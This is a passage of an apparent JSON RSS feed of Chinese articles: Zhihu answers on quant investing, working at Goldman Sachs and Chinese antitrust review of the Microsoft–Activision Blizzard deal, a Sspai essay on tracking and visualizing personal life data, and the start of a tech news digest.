structure也都算近几年的学术前沿…总之量化投资真不是SQL boy或者CRUDer转行写几行代码就能做的事情。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://zhuanlan.zhihu.com/p/454851495?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/454851495?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"在高盛 (Goldman Sachs) 工作是一种怎样的体验？","date":"2022-02-16 05:14:57","description":"\n<p data-pid=\"hiFYM6Cp\">Class of 2020</p>\n<p data-pid=\"RfMBu5iq\">一直很想写下这个回答，下周就是参加工作两周年了，终于觉得准备好动笔记录一下自己踏上社会的第一份工作老东家。</p>\n<p data-pid=\"VfYy0fmd\">入职之前就听说，GS是最强的M&amp;A+trading powerhouse（现在在DJ的领导下多了consumer/fintech push）。记得刚拿到offer可激动了，那会儿我在一家金融科技公司实习，和老板说我不干了，去GS全职啦，之前在GS(Hull)做过的老板说，太妙啦，这就给你办离职手续哒！后来，在GS并没有呆自己以为会呆的那么久就离开了，离开后的第一周就买了GS的股票，还是有很深的感情，也很因为这份经历而开心的。</p>\n<p data-pid=\"2gkV6TYc\">如果只用一个词来形容在GS工作的体验，我觉得是，珍惜羽毛。不光和在职员工交流，会互问Kerberos (后来很多个人账号名我都还用着Kerberos起名)，在金融行业工作很难身边没有曾在GS有过一段经历的人，说实话，我现在的公司组里最喜欢的同事就是一个GS 17年出来的前辈 (他那年恰逢911，我那年恰逢疫情，我们作为两个校招，都没有完整的orientation体验，也是很迷了)，那天我们一起吃午饭，发现他用了十几年我们组当时own的祖传代码xD，一下就觉得很亲切。因为GS强的人很多，同时并不是所有人都适合大机构，蛮多人做一两年就去买方了，之后职业生涯会经常打交道，因此保持谦逊的心态，多向前辈请教，多和同辈交流，好好工作，做出好的工作，让人觉得踏实靠谱，成为了我一大做人做事的原则，觉得是十分宝贵的收获。</p>\n<p data-pid=\"WqTUxOhW\">还想借此机会谈谈GS的文化。GS是很宠小朋友的，培训好，ramp up时间也不短，离职前夕，我的领导知道我想尝试别的工作内容，给我安排了很多不同组的MD 1on1，那些MD们愿意从繁忙的会议中抽出时间挽留一个小Analyst，我部门的MD更是和我说想回部门给她发邮件就好，令当时的我诚惶诚恐，实在是印象很深的一件事。</p>\n<p data-pid=\"iUBBmTnI\"> GS当然不是没有缺点，但我不觉得是对任何人来说，不值得呆上一段时间的地方，尤其是对小朋友，一份暑期实习也好。等发完离职邮件的那一刻起，SecDB的蓝屏有多retro，support有多累，back2back的会有多多，都付笑谈中。</p>\n<p data-pid=\"YSAbo9xM\">GS is and will always be what you make of it. Go, Make Things Possible : )</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/BruceWDZ?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">水心记</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24396479/answer/2303649981?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">73 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/39825907?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高盛和摩根士丹利哪家更厉害？</a><br><a href=\"http://www.zhihu.com/question/20177342?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么经济实力不如摩根大通的摩根士丹利反而被称作“大摩”？</a><br>\n","link":"http://www.zhihu.com/question/24396479/answer/2303649981?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"微软收购动视暴雪会有垄断的风险吗？最后会被反垄断机构阻拦吗？","date":"2022-02-16 05:13:58","description":"\n<p data-pid=\"7eRN4bmz\">并不是每一起跨国并购都需要中国政府批准，比如上周公布的Take-Two公司 127亿美元收购社交游戏巨头Zynga公司的交易应该就不需要中国政府批准。因为的Take-Two公司的主要收入来源《侠盗飞车》游戏因为过于暴力，不可能取得版号，所以并没有被引进国内，而Zynga公司主要运营的是Facebook上的社交网络上的社交游戏，Facebook也没有在中国运营，即便这两家公司在中国有一些诸如知识产权授权的收入，但都不会达到经营者集中审查的标准。 这个新闻公布后，作为律师，我倒是认为应该要审查。</p>\n<p data-pid=\"V9CfwoXN\"><b>一、中国政府审查的法律依据和标准是什么？</b></p>\n<p data-pid=\"hOAEhXlQ\">这虽然是两家美国公司直接的合并，但鉴于他们都是跨国公司，所以中国政府对于这个交易也需要进行审查。法律依据是《反垄断法》第21条：经营者集中达到国务院规定的申报标准的，经营者应当事先向国务院反垄断执法机构申报，未申报的不得实施集中。 </p>\n<p data-pid=\"3zJ5EoCl\">根据《国务院关于经营者集中申报标准的规定》，微软和动视暴雪的交易要不要申报有两条标准，如果都符合，就应当申报：</p>\n<p data-pid=\"PsZXKE9n\">1、两家公司上一会计年度在全球范围内营业额合计是不是超过100亿元人民币？</p>\n<p data-pid=\"kEIpRmSb\">2、他们的上一会计年度，在中国境内的营业额是不是都超过了4亿元人民币？ </p>\n<p data-pid=\"k-QwrULm\"><b>二、微软和暴雪达到审查标准了吗？</b></p>\n<p data-pid=\"evsdp5gL\">微软和动视暴雪这两大巨头全球收入巨大，在国内营业额也十分可观。微软总裁2020年初称该公司每年来自中国的收入占总营收的<a href=\"http://link.zhihu.com/?target=https%3A//baijiahao.baidu.com/s%3Fid%3D1655882258667359973%26wfr%3Dspider%26for%3Dpc\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">1.8%</a><a href=\"https://www.zhihu.com/question/512223257#_edn2\" class=\"internal\">[ii]</a>，而2019-2020财年该公司的总收入为<a href=\"http://link.zhihu.com/?target=https%3A//pdf.dfcfw.com/pdf/H3_AP202010281424265844_1.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">1430亿美元</a><a href=\"https://www.zhihu.com/question/512223257#_edn3\" class=\"internal\">[iii]</a>，折算下来有25亿美元。 </p>\n<p data-pid=\"brZKGDgw\">而暴雪公司2020年全球收入为<a href=\"http://link.zhihu.com/?target=https%3A//www.sohu.com/a/517523073_115565\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">80亿美元</a><a href=\"https://www.zhihu.com/question/512223257#_edn4\" class=\"internal\">[iv]</a>，在中国的收入也十分可观。暴雪没有公布其国内收入，但我们可以从其国内游戏代理方网易的收入以及分成比例估算。根据网易的2020年<a href=\"http://link.zhihu.com/?target=https%3A//www.sec.gov/ix%3Fdoc%3D/Archives/edgar/data/0001110646/000110465921055902/ntes-20201231x20f.htm\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">财报</a><a href=\"https://www.zhihu.com/question/512223257#_edn5\" class=\"internal\">[v]</a>，“授权游戏的净收入从 2019 年的人民币 44.570 亿元增加至 2020 年的人民币 67.231 亿元（合 10.304 亿美元），主要是由于暴雪授权的《魔兽世界》和某些其他授权游戏。” </p>\n<p data-pid=\"aHrG_fck\"> 实际上除了魔兽世界，网易公司还代理了动视暴雪的一系列经典游戏，哪怕暴雪游戏在授权游戏中的收入只占到50%，网易的暴雪游戏收入也有33.6亿人民币，而对应的暴雪分成收入，即便按照十多年前九城代理《魔兽世界》时的22%的分成比例（<a href=\"http://link.zhihu.com/?target=https%3A//games.qq.com/z/wow/huati/wowdl_blz.htm\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">业内传言</a><a href=\"https://www.zhihu.com/question/512223257#_edn6\" class=\"internal\">[vi]</a>网易把《魔兽世界》55%的收入给了暴雪），暴雪2020年在华也有近10亿元人民币的收入。所以，暴雪和微软不论是全球营业额还是中国营业额都远远超过中国法律规定的申报标准，这个交易需要履行经营者集中申报义务。 </p>\n<p data-pid=\"vZ3pCHUa\"><b>三、可能有谁来搅局？</b></p>\n<p data-pid=\"sNaNw9UE\">目前我国的经营者集中审查的审查机关是国家市场监督管理总局，根据该局颁布的《经营者集中审查暂行规定》，这个交易的申报需要提交很多文件，但审查的核心是就经营者集中对相关市场竞争状况影响的说明。 </p>\n<p data-pid=\"qOywweEb\">这是一个非常专业的领域，笔者就简单介绍一下说明会涉及的相关市场界定。对于交易申报方而言，相关市场界定的越大，其所占的市场份额就越小，就容易通过审查，反之则不容易通过审查。比如360诉腾讯反垄断案中，腾讯公司主张电子邮件也是即时通讯的相关市场，因为把电子邮件加上，腾讯的市场份额肯定就小于50%了，但这个主张最高人民法院没同意。  </p>\n<p data-pid=\"2X9hKevu\">被收购的动视暴雪公司是一家（正在衰落的）老牌游戏公司，该公司的《魔兽世界》、《使命的召唤》等游戏对传统的个人电脑在线游戏市场和主机游戏市场影响力较大，而对基于移动端的游戏市场影响力较小，考虑到游戏产业竞争的是玩家的游戏时间，所以如果微软在申报时把个人电脑在线游戏市场、主机游戏市场、基于移动端的游戏市场合并为一个相关市场，也不出人意料。 </p>\n<p data-pid=\"46Heteq6\">笔者个人的看法是，游戏是一个竞争较为自由和充分的市场，且市场领先者很容易被后来者超越，比如在上个世纪以及本世纪初，动视暴雪的《魔兽世界》、《暗黑破坏神》等游戏风靡世界，但随着移动端游戏的崛起，现在腾讯的《王者荣耀》、《和平精英》才是最红的游戏，腾讯的游戏收入也已经远远超过了暴雪。所以这个交易获批的可能性还是不小的，关键在于有没有竞争对手搅局。 </p>\n<p data-pid=\"Y7uAnxQ2\">主机游戏平台市场就存在搅局的变量。微软的Xbox、索尼的Play Station和任天堂的Switch是三大主机平台，主机平台的玩家通常对游戏品质要求较高，可能会被界定为是一个独立的相关市场。动视暴雪以出精品MMORPG游戏闻名，旗下的游戏在主机平台很受欢迎，微软收购动视暴雪后，如果能独占动视暴雪的后续作品，势必会对索尼的Play Station平台产生不小的冲击，实际上，微软收购动视暴雪的新闻发布后，<a href=\"http://link.zhihu.com/?target=https%3A//xw.qq.com/amphtml/20220119A0271U00\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">索尼当天股价就跌了近10%</a><a href=\"https://www.zhihu.com/question/512223257#_edn7\" class=\"internal\">[vii]</a>。 </p>\n<p data-pid=\"8P0VyrgT\">所以，不能排除其他主机平台的运营者或相关利益方就这个交易向市场监管总局提出异议。最大的可能性当然是索尼公司，但这家日本老牌公司一般法律动作上比较矜持，要保持大公司的体面，我个人的判断是，如果微软收购暴雪后不违反原先暴雪和索尼的合作合同的，索尼估计不会对这个交易提异议。 </p>\n<p data-pid=\"bczKV8Oi\">而Play Station和Xbox国内分别由索尼和微软的合资公司索尼互动娱乐（上海）有限公司及上海百家合信息技术发展有限公司负责游戏发行等业务，合资公司的国内股东都是上海东方明珠公司的关联公司，对东方明珠而言，两个主机游戏的发行收入是左口袋和右口袋的关系，所以应该不会就这个并购提出异议。 </p>\n<p data-pid=\"QUDTmkE_\">至于Switch平台，虽然也发行了暴雪的《暗黑破坏神3》游戏，但总体而言他们更偏重休闲游戏，所以微软暴雪的交易对任天堂以及Switch国内的合作方腾讯公司的影响没有索尼那么大。他们提起异议的可能性也不大。 </p>\n<p data-pid=\"vUlvnXDQ\">最后，作为主要服务于互联网企业尤其是游戏企业的律师，笔者看到微软和动视暴雪的天价并购交易非常羡慕，因为最近一年多来，国内互联网企业的经营环境越来越不宽松，舆论和合规压力都日渐加大，原本活跃的并购交易已经非常鲜见。期待我国的互联网市场整顿早日完成，让我们的互联网企业恢复正常的融资和并购环境，在我们国家自己培养的有竞争力的企业参与国际竞争时能有一个稳定的大后方。<br></p>\n<hr>\n<p data-pid=\"e60AU9KS\"><a href=\"https://www.zhihu.com/question/512223257#_ednref1\" class=\"internal\">[i]</a> <a href=\"http://link.zhihu.com/?target=https%3A//baijiahao.baidu.com/s%3Fid%3D1722351281930783287%26wfr%3Dspider%26for%3Dpc\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">baijiahao.baidu.com/s?</span><span class=\"invisible\">id=1722351281930783287&amp;wfr=spider&amp;for=pc</span><span class=\"ellipsis\"></span></a> <br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref2\" class=\"internal\">[ii]</a> <a href=\"http://link.zhihu.com/?target=https%3A//baijiahao.baidu.com/s%3Fid%3D1655882258667359973%26wfr%3Dspider%26for%3Dpc\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">baijiahao.baidu.com/s?</span><span class=\"invisible\">id=1655882258667359973&amp;wfr=spider&amp;for=pc</span><span class=\"ellipsis\"></span></a> <br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref3\" class=\"internal\">[iii]</a> <a href=\"http://link.zhihu.com/?target=https%3A//pdf.dfcfw.com/pdf/H3_AP202010281424265844_1.pdf\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">pdf.dfcfw.com/pdf/H3_AP</span><span class=\"invisible\">202010281424265844_1.pdf</span><span class=\"ellipsis\"></span></a> <br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref4\" class=\"internal\">[iv]</a> <a href=\"http://link.zhihu.com/?target=https%3A//www.sohu.com/a/517523073_115565\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">sohu.com/a/517523073_11</span><span class=\"invisible\">5565</span><span class=\"ellipsis\"></span></a><br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref5\" class=\"internal\">[v]</a> <a href=\"http://link.zhihu.com/?target=https%3A//www.sec.gov/ix%3Fdoc%3D/Archives/edgar/data/0001110646/000110465921055902/ntes-20201231x20f.htm\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">sec.gov/ix?</span><span class=\"invisible\">doc=/Archives/edgar/data/0001110646/000110465921055902/ntes-20201231x20f.htm</span><span class=\"ellipsis\"></span></a> <br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref6\" class=\"internal\">[vi]</a> <a href=\"http://link.zhihu.com/?target=https%3A//games.qq.com/z/wow/huati/wowdl_blz.htm\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">games.qq.com/z/wow/huat</span><span class=\"invisible\">i/wowdl_blz.htm</span><span class=\"ellipsis\"></span></a> <br><br><a href=\"https://www.zhihu.com/question/512223257#_ednref7\" class=\"internal\">[vii]</a> <a href=\"http://link.zhihu.com/?target=https%3A//xw.qq.com/amphtml/20220119A0271U00\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">xw.qq.com/amphtml/20220</span><span class=\"invisible\">119A0271U00</span><span class=\"ellipsis\"></span></a> <br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/iplawyer?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">游云庭律师</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/512223257/answer/2317653670?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/514305700?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">媒体报道美国联邦贸易委员会将对「微软并购动视暴雪」进行反垄断审查，这会给微软后续战略发展带来哪些影响？</a><br><a href=\"http://www.zhihu.com/question/512761720?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">微软收购动视暴雪后为何国内全网欢呼?</a><br>\n","link":"http://www.zhihu.com/question/512223257/answer/2317653670?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 个人生活的数字化与可视化表达","date":"2022-02-16 03:27:11","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#效率 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<p>就在最近几年，一到年底几乎所有的 app 都会推送一份年度总结。</p>\n<p>可这样的年度总结并不能戳中我的心：首先，这是一份虚假的年度总结，推送时它的数据来源还不完整，尚且无法代表这一年（也有不少 app 会更新数据来源，支持反复查询）；其次，因为一些偶发事件导致年度总结有所偏颇，俗称「没法看」。</p>\n<p>我在 2019 年补标了很多书影音，实际上并没有在这一年真正看过。这一随手补标导致豆瓣年度总结失去了真实性，也失去了分享的意义。同年，我开始了个人记录的数字化尝试，并有幸读到了一位豆瓣友邻「没脚鸟」的可视化总结 <a href=\"https://www.douban.com/note/702250698/?_i=3774150M2ds2pU\" target=\"_blank\">「2018 数据可视化总结」</a> ，由此开启了个人生活的数字化与可视化化表达的尝试。</p>\n<h2><strong>几种数字化与可视化的尝试</strong></h2>\n<p>生活记录的数字化不需要你拥有特殊的技能，它和写日记一样，最困难的地方在于坚持。我目前使用的工具是 Microsoft Excel，如果你是技术大佬，那可以为自己提供一些更方便的记录方式。目前可以用于生活记录数字化的 app 有很多，舍弃它们，但可以通过它们想一想自己需要记录的内容有哪一些。</p>\n<p>我正在记录的数字化内容有四项：必要摄入、不健康摄入、心情和活动。必要摄入即一日三餐，不过一日四五餐和一日两餐时有发生；不健康摄入主要指酒精、咖啡和奶茶。</p>\n<p>下面和大家分享一下我的记录方式与可视化结果，以及记录过程中犯下的种种错误。</p>\n<h3><strong>必要摄入</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/02/ae19eee40d9e2dd324ae736910673a08.png\"><figcaption>必要摄入表头</figcaption></figure><p>这是必要摄入的表头，由于英语水平不佳，暂不展示完整单词，一天中我需要记录10个原始数据。</p>\n<ul>\n<li>Date：日期；</li>\n<li>SF：具体摄入，例如：包子、馄饨、三明治、寿喜锅、妈妈烧的饭等；</li>\n<li>BS、LS、DS：摄入分类，例如：中式日常、中式地方、西式、日式等；</li>\n<li>Lo.：地点，例如餐饮店、食堂、家等。</li>\n</ul>\n<p>在正式记录开始之前，我列举了一部分可能的摄入分类和地点，避免后续统计过程中种类过于繁杂。如果出现一日两餐，则没有吃的那一顿用「/」表示，如果出现一日四五餐，择优录取三餐进行记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/1eee2b401f30325bc7dc88d1faddfa89.jpg\"></figure><p>我将必要摄入的统计图做成了饼图。第一张图是 2020 年的统计结果，考虑到不吃饭「/」的百分比是一样的，我将摄入分类和地点两张图表进行了嵌套。后面两张图则是 2021 年的统计结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/0b4072bb366a77b72f332d907e08aa0b.jpg\"><figcaption>2020 年统计结果（左一）；2021 年统计结果（中间与右一）</figcaption></figure><p>虽然这一份统计没有给我带来有意义的饮食改善建议，但我惊讶地发现在每年需要吃的一千余顿饭中（闰年 1098 顿，其他年份 1095 顿），约十分之一的必要摄入被我舍去了。2020 年我没有吃饭的百分比是 9.3%，2021 年我没有吃饭的百分比降低至 8.1%——仍然不是个小数目。在年末的统计中，我也会发现很多被遗忘的生活细节：我曾经在湖边和草地吃饭，也曾在出租车和医院进食，前者是闲暇，后者是生活的「不得不」。</p>\n<h3><strong>不健康摄入</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/0e1183419e9317862b99f844f77ba89b.png\"><figcaption>不健康摄入表头</figcaption></figure><p>不健康摄入的表头比较易懂，AI、MI 和 CI 分别指酒精、奶茶和咖啡的杯数。这是十分粗糙的计数方法，本着珍惜粮食的精神，我在记录过程中极少遇到喝了半杯咖啡的尴尬情况。更加严谨和科学的记录应该是体积，此种记录要花费一部分精力记住精确的数字，似乎不太值得。</p>\n<p>不健康摄入的数量变化与月份关联度较高，因此采用了雷达图的方式进行呈现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/deb290ae4d08828cfe7b1d51b4602833.jpg\"><figcaption>2020 年统计结果（左）；2021 年统计结果（右）</figcaption></figure><h3><strong>心情记录</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/468f156fe6d3b45a0a518d1e810ec3fd.png\"><figcaption>心情记录表头</figcaption></figure><p>每天的心情记录需要两个数据，MI 记录当日心情值，按照七分制打分，最高 3 分，最低 -3 分；CON 记录当日是否出现极端情绪，出现则记录 1，否则记录 0。每月结束的时候取 MI 的平均值和 CON 的标准差来反应当月情绪。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/c46e7e76fde833a5649ae611eaaebbc0.jpg\"><figcaption>2020 年统计结果（左）；2021 年统计结果（右）</figcaption></figure><p>回顾情绪比较差的几月，生活中都发生了重大的变化，今年十二月第一次实现了「零极端情绪月」，算得上里程碑意义了。</p>\n<h3><strong>活动记录</strong></h3>\n<p>活动记录是 2021 年才开始尝试的，将一天划分为早上、下午和晚上三个时段进行记录。由于没有提前考虑好这些记录的用途，因此最后的统计结果和实际有一些偏差。一是记录的标准不统一，有些记录了地点，有些记录了事情；二是一部分小格中记录了一件事，一部分记录了多件事，最多的小格记录了四件事情，但最后的统计是按事情进行的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/9f9c7ada8db04978c79ca05e879184ba.png\"><figcaption>活动记录表</figcaption></figure><p>在计算机的分类统计和本人手动统计之后，2021 的时间分布也考虑用饼图进行朴素呈现。符合劳动法的工作时间占比应为 45.66%<sup class=\"ss-footnote\" href=\"\" title=\"2021 年共有 250 个工作日，需工作 500 个小格子，一年共 1095 个小格子，工作占比约 45.66％。\" footnote-id=\"1\">1</sup>，可以算一算你的工作时间超标了吗？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/371f5076050586eda191ff0b48b07ed9.png\"><figcaption>2021 年统计结果</figcaption></figure><p>除了时间分布统计，我还尝试做了地理位置变化图，这一份地理位置图经历了三年三个不同版本。</p>\n<p>2019 年绘制方式：排除常驻地杭州后统计了前往其他各地的次数，在地图上用颜色的深浅表示频次的高低，绘制了 2019 足迹地图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/bba85f20f04906d36f22d05f6f11a15d.jpg\"><figcaption>2019 足迹地图</figcaption></figure><p>2020 年绘制方式：统计了各地的出入度（我也不知道当时怎么就选了这么个数据），利用精确经纬度绘制了地形热力图。和上一年相比最大的进步是图会动了！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/604a312beb1531867760fff835555850.gif\"><figcaption>2020 足迹地图</figcaption></figure><p>2021 年绘制方式：依据主体足迹的变化绘制了随时间变化的热力图。热力图的数值与在该地的时间长短相关，不过如果当月没有出行的话图上就什么标记都不存在了，因此 2021 年的足迹地图时间轴只显示到 10 月。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/d2c15e4fc2da717ba0ffb692a331fb9b.gif\"><figcaption>2021 足迹地图</figcaption></figure><h2><strong>自评表的构建</strong></h2>\n<p>一份适合分享的年度总结少不了总结页面，我在 2021 年构建了一份属于自己的自评表格用以在未来进行横向比较。</p>\n<p>自评表的基础逻辑很简单：四大象限，每个象限含有五个小项，每一项都采用五分制评分，满分 100 分。</p>\n<p>四大象限的划分参考了生命之花模型，生命之花模型中将人生分为四大重要内容：个人家庭社会事业；这些词对我来说太抽象了，于是我重新梳理了这些词对我的逻辑得到了新的四大象限：职业发展，个人成长，人际关系，个人幸福。</p>\n<p>通过下面这张图或许可以帮助大家更清晰地进行定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/55772ce9500aaf5993c1b83f491423e0.jpg\"><figcaption>经典模型（左），图片来源： <a href=\"https://www.yinxiang.com/everhub/note/b8fb2c5d-839e-4b6a-bd82-46dd6fe566ad\" target=\"_blank\">印象识堂</a> ；改良模型（右）</figcaption></figure><p>简单地说，改良后的模型可以从三个维度去理解。</p>\n<ul>\n<li>第一个维度：与自己相处 VS 与他人相处。图片中左上和右下的两大象限即为和自己相处，左下和右上的两部分即为和他人相处。</li>\n<li>第二个维度：目标型 VS 关系型。目标型两大象限的评分往往与结果和产出密切联系，而关系型的评分更注重体验与感受。</li>\n<li>第三个维度：力量型 VS 支撑型。力量型两大象限可以给我们直接的生活动力，支撑型的两大象限则起到了兜底作用。</li>\n</ul>\n<p>我填写了 2021 年的表格，补上了 2020 年的数据，绘制了两年的比较雷达图。你看，2021 年过得也不差嘛！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/89586b0a1cc63a1ee6407b007f610334.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/03/0a5c6a692bc19fedea923ab3c9cfa97f.png\"></figure><hr>\n<p>谢谢大家读到这里！这是我在少数派发表的第一篇文章，因为太拖延所以没有写「新人报道」，最后祝大家新年快乐！</p>\n<p>附上我过去两年的个人总结 <a href=\"https://mp.weixin.qq.com/s/NdT_uFHe2ul2nDfjxE3t_Q\" target=\"_blank\">「2020」</a> <a href=\"https://mp.weixin.qq.com/s/fDeA0mW5Ssj8j4ROn6vW-Q\" target=\"_blank\">「2021」</a> ，内容和本文有一部分重叠，感兴趣的话可以戳链接来我的公众号看看。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71268"},{"title":"派早报：索尼推出 LinkBuds 开放式耳机、OPPO 与哈苏达成影像战略合作等","date":"2022-02-16 00:59:06","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>索尼推出 LinkBuds 开放式耳机</h3>\n<p>2 月 15 日，索尼正式推出 LinkBuds 开放式耳机。LinkBuds 本体采用尺寸为 12mm 的环状设计，允许佩戴者听到更多环境声音；搭载与 WF-1000XM4 相同的 V1 处理器，支持 DSEE 音质提升但并不支持 LDAC 和任何降噪功能；单次充电最多可提供 5.5 小时持续播放时间，配合耳机盒可额外获得 12 小时续航，但耳机盒并不支持无线充电。LinkBuds 提供 IPX4 防水性能，支持通过 Fast Pair（Android）、Swift Pair（Windows）快速配对；提供深灰、白色两种可选配色，售价 179.99 美元起。<a href=\"https://www.theverge.com/2022/2/15/22933361/sony-linkbuds-price-specs\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c864mjlb34ta9bscqvig.jpeg\"></figure><h3>OPPO 与哈苏达成影像战略合作</h3>\n<p>2 月 15 日，OPPO 正式宣布与哈苏达成战略合作，两者将协同研发计算色彩以及计算光学技术，并打造全新的手机影像系统。据悉，这套影像系统将在新一代 Find X 中搭载。<a href=\"https://weibo.com/1710173801/Lfyw4fzFH\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c864mjtb34taatkrlu20.jpeg\"></figure><h3>微软正式推出多项 Windows 11 功能更新</h3>\n<p>2 月 15 日，微软通过官方博文宣布为稳定版 Windows 11 用户带来多项功能更新，包括 Android 子系统的公开预览版、任务栏改进、重新设计的 Media Player 和记事本应用等等。<a href=\"https://blogs.windows.com/windowsexperience/2022/02/15/bringing-you-closer-to-what-you-love-with-new-experiences-in-windows-11/\" target=\"_blank\">来源</a></p>\n<h3>英特尔宣布收购 Tower 半导体</h3>\n<p>2 月 15 日，英特尔官网更新公告，宣布正式与 Tower Semiconductor 达成收购协议，英特尔将以每股 53 美元的价格现金收购 Tower Semiconductor，收购总价值高达 54 亿美元。<a href=\"https://www.intel.com/content/www/us/en/newsroom/news/feb-2022-corporate-news.html\" target=\"_blank\">来源</a></p>\n<h3><strong>Olympus 推出 M4/3 可换镜头相机 OM1</strong></h3>\n<p>于 2021 年 10 月更名为 OM System 的 Olympus 